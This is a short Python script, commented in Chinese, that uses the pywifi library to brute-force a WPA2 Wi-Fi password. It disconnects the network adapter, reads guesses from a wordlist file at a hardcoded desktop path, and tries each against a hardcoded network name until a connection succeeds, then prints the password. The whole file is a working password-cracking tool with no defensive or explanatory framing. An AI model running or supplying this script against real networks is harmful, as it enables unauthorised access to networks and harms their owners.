import pywifi
import time
from pywifi import const
import getpass

User_name = getpass.getuser()


class PoJie():

    def __init__(self, name):
        self.name = name
        wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = wifi.interfaces()[0]  # 获取网卡
        self.iface.disconnect()  # 断开所有连接
        time.sleep(1)
        if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:  # 测试是否已经断开网卡连接
            print("已经成功断开网卡连接")
        else:
            print("网卡连接断开失败")

    def solve(self):
        x = 1
        f = open('C:/Users/jsyzdlf/Desktop/password.txt', 'r')
        # f = open('password.txt','r')
        lines = f.readlines()
        for line in lines:
            print('正在尝试第%d次' % (x))
            x += 1
            profile = pywifi.Profile()  # 创建wifi配置对象
            profile.ssid = self.name  # wifi名称
            profile.key = line  # WiFi密码
            profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
            profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法，一般是 WPA2PSK
            profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
            self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
            tem_profile = self.iface.add_network_profile(profile)  # 添加新的WiFi文件
            self.iface.connect(tem_profile)  # 连接
            time.sleep(3)  # 连接需要时间
            if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接成功
                print("成功连接，密码是%s" % (line))
                break
            else:
                print("连接失败，密码是%s" % (line))


if __name__ == "__main__":
    name = 'DPTP-AP-2FVIP'
    obj = PoJie(name=name)
    obj.solve()
